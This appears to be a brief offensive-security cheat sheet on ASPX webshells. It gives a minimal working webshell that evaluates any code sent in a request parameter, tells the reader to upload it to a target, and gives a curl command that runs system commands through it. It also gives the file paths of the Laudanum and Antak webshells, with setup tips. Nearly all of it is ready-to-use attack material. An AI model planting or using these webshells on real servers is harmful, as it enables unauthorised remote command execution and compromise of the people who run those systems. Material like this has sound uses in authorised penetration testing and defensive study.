# Aspx Webshell

### Minimal .aspx webshell

**Save as spam.aspx**

```aspx
<script language="JScript" runat="server">
function Page_Load(){
eval(Request["shell"],"unsafe");
}
</script>
```

**Upload to Target**

**Interact**

```bash
curl -s -k https://$host/spam.aspx \
  -d 'shell=Response.Write(
    new ActiveXObject("WScript.Shell")
      .Exec("cmd /c whoami")
      .StdOut
      .ReadAll()
);' | head -n 1
```

### **Laudanum ASPX webshell**

```
/usr/share/webshells/laudanum/aspx/shell.aspx
```

* Add IP to list of allowed IPs

### **Antak**

```
/usr/share/nishang/Antak-WebShell/antak.aspx
```

* Set credentials on line 14
*
